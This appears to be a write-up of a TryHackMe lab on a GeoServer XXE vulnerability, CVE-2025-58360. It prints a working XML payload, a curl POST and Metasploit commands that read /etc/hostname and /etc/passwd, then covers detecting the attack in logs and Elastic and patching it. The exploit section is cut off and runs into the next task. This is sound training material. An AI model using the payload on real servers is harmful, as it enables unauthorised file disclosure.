<h2>Task 2 . Exploring GeoServer</h2>
<p><strong>GeoServer</strong> is an open-source server that enables users to publish, share, and edit geospatial data. Imagine a logistics and transportation company that needs to publish real-time and historical map data for its customers. Their maps may include warehouse or distribution center locations, delivery routes, service areas, and more. Internal dashboards, which we will explore shortly, can be used by the operations team, and public-facing web applications may be used by their customers.</p>

<h6 align="center"><img width="150px" src="https://github.com/user-attachments/assets/0c251266-2c69-464c-a73e-563ff93b8369"><br>This image and all the theoretical content of<br>the present article is TryHackMe´s property.</h6>

<h3>Who Uses GeoServer?</h3>
<p>GeoServer is widely used across both public and private sectors to manage and distribute geospatial data.<br>

- <strong>Government agencies</strong>: urban planning, transportation, and land management
- <strong>Emergency services and disaster response</strong>: visualize incident locations and evacuation routes
- <strong>Environmental and climate research</strong>: share satellite imagery or environmental data
- <strong>Utility providers</strong>: map and manage infrastructure such as water systems and pipelines
- <strong>Private companies</strong>: logistics and mapping to support routing and asset tracking</p>

<h3>Checking Out GeoServer</h3>
<p>Imagine you run a small logistics company that operates several regional offices. To help customers and partners visualize your service coverage, you deploy a public-facing map powered by GeoServer.<br>

This map displays the locations of your regional offices and is embedded into a simple web application called <code>TryMapMe</code>. Go ahead and navigate to <strong>http://MACHINE_IP:8080/trymapme</strong> and begin answering the questions below.</p>

<h6 align="center"><img width="700px" src="https://github.com/user-attachments/assets/a4aea4dd-546f-4b7e-bf92-1ad0b202d7dc"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<h3>GeoServer From the CLI</h3>
<p>While GeoServer is often accessed through web applications and GIS tools, administrators and developers commonly interact with it using the command line. Tools like curl are frequently used to test services, validate configuration changes, and troubleshoot issues. These requests are typically sent as HTTP GET requests and return structured data such as XML, JSON, or images.</p>

<h2>Task 3 . Exploiting GeoServer</h2>
<p>Now that you've explored GeoServer and its capabilities, let's dive into what makes this vulnerability possible. XML External Entity vulnerabilities arise when a weakly configured XML parser processes input containing a reference to an external entity. If the parser is not restricted, an attacker can potentially access confidential system files or interact with internal network services. Imagine you're filling out a form that accepts XML as input. Instead of only submitting normal data, you include instructions that tell the parser to get data from somewhere else, say a file you want to read.</p>

<h3>How the Attack Works</h3>
<p>As we learned in the previous task, GeoServer supports several XML-based request types, including the  <code>GetMap</code> operation. <code>GetMap</code> is often used with HTTP <code>GET</code> requests, but GeoServer also allows it to be submitted as XML via a  <code>POST</code> request. <br>

When an attacker targets the <code>GetMap</code> operation, the vulnerability unfolds in the following steps:<br>

- <strong>Request</strong>: The attacker sends an HTTP <code>POST</code> request to the GeoServer <code>wms</code> path containing an XML body<br>
- <strong>Parsing</strong>: The server receives the request and utilizes its internal XML parser to read the instructions<br>
- <strong>Weakness</strong>: Because the parser is not restricted, it processes a <code>DOCTYPE</code> declaration that defines an external entity<br>
- <strong>Resolution</strong>: The parser resolves the entity by fetching the resource defined by the attacker (<code>/etc/passwd</code>)<br>
- <strong>Processing</strong>: GeoServer processes the map request, unknowingly incorporating the resolved entity content<br>
- <strong>Exfiltration</strong>: The server includes the contents of the sensitive file in the error message returned to the attacker</p>

<h6 align="center"><img width="700px" src="https://github.com/user-attachments/assets/d352f2a2-973c-44c9-8b83-a109a7f0b0b8"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<h4>Affected Versions</h4>
<p>The target machine in this room is running GeoServer version 2.26.1, which is vulnerable to the XML External Entity (XXE) issue in the <code>GetMap</code> operation. This vulnerability affects versions prior to 2.25.6 as well as 2.26.0 and 2.26.1.</p>

<h3>The Exploit</h3>
<p>To exploit this vulnerability, you will first craft a malicious XML document, then submit it to GeoServer using a <code>curl</code> request that references the XML file.<br>

In the example below, the XML document instructs the server to read the <code>/etc/hostname</code> file. Rather than requesting valid map data, the XML forces the parser to load the file's contents. Go ahead and use your favorite text editor to craft the XML document and name it <code>geoserver.xml</code>.</p>

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<StyledLayerDescriptor version="1.0.0">
<NamedLayer>
<Name>&xxe;</Name>
</NamedLayer>
</StyledLayerDescriptor>
```

<h4>Submitting Your Request</h4>
<p>Now that you have crafted your XML document, it is time to submit the request to the server. Use the command below, let's attempt to read the /etc/hostname file.<br>

<code>curl -X POST "http://MACHINE_IP:8080/geoserver/wms?REQUEST=GetMap&SERVICE=WMS" -H "Content-Type: application/xml" -d @geoserver.xml</code><br>

- <code>curl -X POST</code> sends a <code>POST</code> request to the target server<br>
- <code>http://MACHINE_IP:8080/geoserver/wms?REQUEST=GetMap&SERVICE=WMS</code> your target server, port, and GeoServer path<br>
- <code>-H "Content-Type: application/xml"</code> specifying an XML document<br>
- <code>-d @geoserver.xml</code> referencing the previously created XML document</p>

<h4>Reading the File</h4>
<p>After submitting the request, you will see the following output. The result of the file we want to read, <code>/etc/hostname</code>, can be seen following the <code>Unknown layer:</code> text.</p>

```bash
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE ServiceExceptionReport SYSTEM "http://10.66.172.249:8080/geoserver/schemas/wms/1.1.1/WMS_exception_1_1_1.dtd">
<ServiceExceptionReport version="1.1.1">
  <ServiceException>
    Unknown layer: geoserverxxe # contents of /etc/hostname
  </ServiceException>
</ServiceExceptionReport>
```

<h3>Using Metasploit</h3>
<p>A recent Metasploit <a href="https://www.rapid7.com/db/modules/auxiliary/gather/geoserver_wms_getmap_xxe_file_read/">module</a> has been developed that makes this exploit even easier. Let's test it against the target machine by launching <code>msfconsole</code>, configuring the necessary options, and running the exploit using the following commands. By default, the module reads the <code>/etc/passwd</code> file on the host server.</p>

<p><em>msfconsole.exe</em></p>

```bash
user@tryhackme$ msfconsole -q

msf6 > use auxiliary/gather/geoserver_wms_getmap_xxe_file_read
msf6 > set RHOSTS 10.66.172.249

<h2>Task 4 . Detecting GeoServer</h2>
<p>Before diving into detection, it’s important to understand why this vulnerability is particularly dangerous from a defensive perspective. The GeoServer vulnerability we’re investigating allows XML External Entity (XXE) injection, which can result in arbitrary file reads and, in some cases, server-side request forgery (SSRF). Because GeoServer legitimately processes user-supplied XML as part of its normal operations, malicious payloads can be embedded within valid-looking requests.<br>

When paired with the widespread adoption of GeoServer across public and private sector environments that are often exposed to the internet, this vulnerability becomes particularly high risk. Exploitation can occur without authentication and may leave behind minimal forensic evidence, making detection challenging without proper logging and monitoring in place.</p>

<h3>Investigating Log Data</h3>
<p>Let’s begin our investigation by examining GeoServer’s built-in logging capabilities.<br>

- Navigate to <code>http://MACHINE_IP:8080/geoserver</code><br>
- Login with the default credentials<br>username: ...<br>password: ...<br>
- Locate the built-in log viewer <code>About & Status → GeoServer Logs</code><br>

GeoServer has several built-in logging capabilities, but by default, it shows only <code>WARN</code> and <code>ERROR</code> logs in the built-in log viewer. Thankfully, our previously sent requests are visible as errors in the log viewer. By scrolling through the data, you should be able to find the <code>/etc/hostname</code> file you read along with the <code>flag.txt</code> and <code>/etc/passwd</code> output from the previous task. Note that these logs are quite noisy, so manually reviewing them is not the ideal method of investigation.</p>

<h6 align="center"><img width="500px" src="https://github.com/user-attachments/assets/b1323110-2438-492d-a43a-e6d7ab80858d"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>


<h3>SIEM View</h3>
<p>In this lab, Elastic is running on the target machine, enabling us to centrally search and analyze both GeoServer and Tomcat access logs. Let’s switch over to Elastic and begin our investigation.<br>

- Navigate to <code>http://MACHINE_IP</code><br>
- Login using the credentials below<br>username: ...<brpassword: <br>

Let's first filter for ,code>geoserver_app</code> logs by either selecting the <code>log_type</code> field in the left panel or entering the query <code>log_type: geoserver_app</code>. These logs have been parsed so that the output message from the file read is held in a field named <code>file_output</code>.<br>

In the screenshot below, you can see we found our first request in which we read the <code>/etc/hostname</code> file.<br>

- Filter for <code>log_type: geoserver_app</code><br>
- Check out the <code>file_output field</code></p>

<h6 align="center"><img width="500px" src="https://github.com/user-attachments/assets/b683aae6-3eeb-4ff8-a5fd-a9626216513e"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<h4>Access Logs</h4>
<p>GeoServer’s native logging capabilities are not the only source of visibility available to an analyst. Because GeoServer runs on Apache Tomcat, we can also investigate web access logs, which often provide clearer insight into how an application is used over HTTP.<br><br>

If you recall from the previous tasks, requests sent to GeoServer from the command line are typically GET requests, but we used POST requests to include our XML documents. This makes it much easier to search for our target logs.<br>

It is important to note that web access logs record request metadata, not request bodies. Because the file targeted by the attacker is defined within the XML document itself, the specific file being requested, like /etc/passwd, is not directly visible in the access log data. Instead, analysts must correlate POST requests in the access logs with GeoServer application logs and error messages to determine what actions were performed and what data may have been accessed.<br>

By building a table from both log sources, we can correlate HTTP requests with application responses, allowing us to reconstruct the attacker’s activity even when portions of the payload are not logged. In the example below, the POST request and the resulting flag value from the previous task have been highlighted.<br>

- Add the following fields as columns<br><code>log_type</code><br><code>file_output</code><br><code>http.request.method</code><br><code>url.path</code><br>
- <code>POST</code> request sent to the server<br>
- GeoServer application log with the flag value output</p>

<h3>Investigation</h3>
<p>Let's put all of this information into practice with a mini <code>investigation</code>. The log data for this portion of the task has been added to a new Data view in your Elastic instance. Go ahead and select the investigation Data view in the top-left corner, and make sure you're searching within the time range from <code>January 10, 2026</code>.

<h2>Task 5 . Conclusion</h2>
<p>In this room, you explored a GeoServer XML External Entity (XXE) vulnerability associated with CVE-2025-58360. You practiced exploiting a vulnerable GeoServer instance by crafting a malicious XML document and submitting it via a <code>curl</code> request, then used a Metasploit module to read sensitive files from the system. You then shifted into the defender’s role, investigating evidence of exploitation using GeoServer’s native log viewer and analyzing logs in Elastic to identify suspicious activity and reconstruct the attack timeline.</p>

<h3>Patching and Prevention</h3>
<p>While detection and investigation are critical, the most effective defense against XXE is prevention through proper patching and hardening. GeoServer should be kept up to date with the latest security releases, and XML parsers should be configured to disable external entity resolution if possible.</p>
